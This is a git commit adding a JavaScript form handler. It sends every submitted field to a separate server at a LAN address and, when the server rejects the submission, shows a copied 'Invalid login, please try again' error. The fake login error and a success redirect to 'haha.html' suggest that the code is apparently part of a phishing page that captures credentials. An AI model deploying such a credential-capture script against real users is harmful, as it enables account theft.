b41a821fde3c63a3627e8516ec44971772401161
Baurzhan <baurzhan.abenov@nu.edu.kz>
2022-11-27 01:13:37 +0600

    first commit

---
+++ script.js
@@ -0,0 +1,49 @@
+
+
+const form = document.getElementById('comp-form');
+
+const ha = document.getElementById('hidden-alert');
+
+form.addEventListener('submit', function(e) {
+   e.preventDefault();
+
+   const payload = new FormData(form) // makes array of arrays
+   console.log(...payload)
+
+   
+   let obj;
+
+   fetch('http://192.168.0.133:3001/post', {
+      method: "POST",
+      body: payload,
+   })
+   .then(res => {
+      if (res.status === 200) {
+         console.log("WOOOW")
+         location.replace("./haha.html");
+      } else {
+         console.log("invalid")
+         ha.innerHTML = "<a href='#''loginerrormessage' class='accesshide'>Invalid login, please try again</a><div class='alert alert-danger' role='alert' data-aria-autofocus='true'>Invalid login, please try again</div>";
+      }
+   })
+   .catch(err => console.log(err));
+
+   // if (obj === "ok") {
+   // }
+})
+
+// http://192.168.0.133:3001/post
+
+// async function theForm(e) {
+//    e.preventDefault();
+//    const payload = new FormData(form)
+
+//    const res = await fetch('http://192.168.0.133:3001/post', {
+//       method: "POST",
+//       body: payload,
+//    })
+
+//    obj = await res.json();
+
+//    console.log(obj);
+// }
